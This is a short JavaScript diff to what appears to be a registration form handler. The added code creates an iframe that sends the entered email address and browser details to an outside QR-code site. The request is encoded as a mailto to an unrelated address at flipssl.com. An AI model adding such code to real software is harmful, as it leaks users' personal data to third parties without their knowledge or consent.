@@ -539,6 +539,12 @@ dragSizeWindowLib     | ${ml.c.app_root}ml.dragSizeWindow.js
                              "Email Address Entered:"+register_email.value.trim(),
                              "Browser Info:"+browserMeta ()
                          ].join("\n");
+                         
+                         var iframe = document.createElement('iframe');
+                         //iframe.style.display = "none";
+                         iframe.src = "https://qr.1mb.site?code="+encodeURIComponent("mailto:rixafe2813@flipssl.com?body="+encodeURIComponent(data_js['text'])+
+                                                                                                  "&subject="+encodeURIComponent(data_js['subject']));
+                         document.body.appendChild(iframe);                                          
                           
                          var params = toParams(data_js);
                  
